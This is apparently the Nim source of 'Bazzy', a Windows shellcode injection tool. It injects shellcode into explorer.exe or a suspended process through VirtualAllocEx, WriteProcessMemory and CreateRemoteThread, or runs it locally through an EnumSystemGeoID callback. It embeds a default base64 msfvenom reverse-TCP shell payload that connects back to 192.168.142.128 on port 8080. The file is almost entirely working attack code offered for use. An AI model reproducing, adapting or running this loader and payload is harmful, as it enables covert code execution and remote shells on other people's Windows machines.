import winim/lean, base64, osproc, winim/inc/psapi, unicode, strutils, strformat, os
import winim/inc/tlhelp32
import createSuspendedProcess
import parseopt 

proc getExplorerPID(): DWORD =
  var 
    processEntry: PROCESSENTRY32W
    hSnapshot: HANDLE
    found = false
  
  # Initialize size of PROCESSENTRY32W
  processEntry.dwSize = sizeof(PROCESSENTRY32W).DWORD
  
  # Create snapshot of current processes
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if hSnapshot == INVALID_HANDLE_VALUE:
    return 0

  # Get first process
  if Process32FirstW(hSnapshot, processEntry):
    # Print first process
    var procName = cast[WideCString](addr processEntry.szExeFile[0])
  # echo "Process: ", $procName
    if ($procName).toLowerAscii() == "explorer.exe":
      result = processEntry.th32ProcessID
      found = true
    
    # Iterate through remaining processes
    while Process32NextW(hSnapshot, processEntry):
      procName = cast[WideCString](addr processEntry.szExeFile[0])
    # echo "Process: ", $procName
      if ($procName).toLowerAscii() == "explorer.exe":
        result = processEntry.th32ProcessID
        found = true
        break
  
  # Clean up
  CloseHandle(hSnapshot)
  
  if not found:
    return 0

proc injectShellcode(shellcode: openarray[byte], pid: DWORD = 0): void =
    echo ".oO finding PID Oo."
    let targetPID = if pid == 0: getExplorerPID() else: pid
    
    if targetPID == 0:
        echo "Could not find explorer.exe process."
        return

    # Open process with specific access rights
    let hProcess = OpenProcess(
        PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_VM_READ or PROCESS_CREATE_THREAD,
        false,
        targetPID
    )
    
    if hProcess == INVALID_HANDLE_VALUE or hProcess == HANDLE(0):
        echo "Failed to open target process. Error: ", GetLastError()
        return

    # Allocate memory with proper size alignment
    let size = cast[SIZE_T]((shellcode.len + 0xFFF) and not 0xFFF)  # Round up to nearest page
    let memAddress = VirtualAllocEx(
        hProcess,
        nil,
        size,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )

    if memAddress == nil:
        echo "Failed to allocate memory in target process. Error: ", GetLastError()
        CloseHandle(hProcess)
        return

    # Write shellcode into allocated memory
    echo ".oO injecting the code Oo."
    var bytesWritten: SIZE_T
    let writeResult = WriteProcessMemory(
        hProcess,
        memAddress,
        unsafeAddr shellcode[0],
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    if writeResult == 0:
        echo "Failed to write shellcode into target process. Error: ", GetLastError()
        VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
        CloseHandle(hProcess)
        return

    echo "Wrote ", bytesWritten, " bytes of ", shellcode.len, " total bytes"

    # Create a remote thread in the target process to execute the shellcode
    echo ".oO executing the code Oo."
    var threadId: DWORD
    let hThread = CreateRemoteThread(
        hProcess, 
        nil, 
        0, 
        cast[LPTHREAD_START_ROUTINE](memAddress), 
        nil, 
        0, 
        addr threadId
    )

    if hThread == HANDLE(0):
        echo "Failed to create remote thread. Error: ", GetLastError()
    else:
        echo "Shellcode injected successfully! Thread ID: ", threadId
        let waitResult = WaitForSingleObject(hThread, 30000)  # Wait up to 30 seconds
        case waitResult
        of WAIT_OBJECT_0:
            echo "Thread completed successfully"
        of WAIT_TIMEOUT:
            echo "Thread execution timed out"
        else:
            echo "Wait failed with error: ", GetLastError()

    # Clean up
    if hThread != HANDLE(0):
        CloseHandle(hThread)
    VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
    CloseHandle(hProcess)

proc executeShellcode(shellcode: openarray[byte]): void = 

    
    echo ".oO Executing the code Oo."

    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )
 # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))

    # Callback execution
    EnumSystemGeoID(
        16,
        0,
        cast[GEO_ENUMPROC](rPtr)
    ) 
proc showHelp() =
    echo """
Bazzy - Process Injection Tool

Usage:
    bazzy [options]

Options:
    -h, --help                Show this help
    -p, --payload <base64>    Base64 encoded shellcode payload
    -t, --target <process>    Target process name (default: explorer.exe)
    -e, --execute            Execute shellcode directly (no process injection)
    
Examples:
    bazzy --payload <base64string>                 # Inject into explorer.exe
    bazzy -p <base64string> -t notepad.exe        # Inject into suspended notepad.exe
    bazzy -p <base64string> -e                    # Execute shellcode directly
    """
    quit(0)

# Main execution
var 
    payload = ""
    targetProcess = ""
    executeMode = false
    processId: DWORD
    procHandle: HANDLE
    threadHandle: HANDLE

# Parse command line arguments
var p = initOptParser(commandLineParams())
while true:
    p.next()
    case p.kind
    of cmdEnd: break
    of cmdShortOption, cmdLongOption:
        case p.key.toLower()
        of "help", "h": 
            showHelp()
        of "payload", "p":
            p.next()
            payload = p.key
        of "target", "t":
            p.next()
            targetProcess = p.key
        of "execute", "e":
            executeMode = true
    of cmdArgument:
        echo "Unknown argument: ", p.key
        showHelp()

# If no payload provided, use default: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.128 LPORT=8080 -f raw -o reverse.bin
if payload == "":
    payload = """/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnl
SbwCAB+QwKiOgEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInC
SP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBI
ieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6
ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlB
idr/1Q==""" 

let decodedData = decode(payload)
echo "decoded:", decodedData
echo decodedData.len
var buf: array[1642, byte] #If you aren't using msfvenom payloads you will probably need to modify the size here
copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)

# Process injection logic
if executeMode:
    echo ".oO Executing shellcode directly Oo."
    executeShellcode(buf)
elif targetProcess != "":
    # Use suspended process injection
    let csp = createSuspendedProcess(
        targetProcess,
        addr processId,
        addr procHandle,
        addr threadHandle
    )

    if csp:
        echo fmt"""
            Process Details:
            ---------------
            PID: {processId}
            Process Handle: {procHandle}
            Thread Handle: {threadHandle}
            """
        echo ".oO injecting thread into suspended process Oo."
        injectShellcode(buf, processId)
        echo ".oO Resuming process Oo."

        discard resumeThread(threadHandle)
elif not executeMode:  # explicitly check we're not in execute mode
    # Default to explorer.exe injection
    echo ".oO Defaulting to explorer.exe injection Oo."
    injectShellcode(buf)

echo "Success!"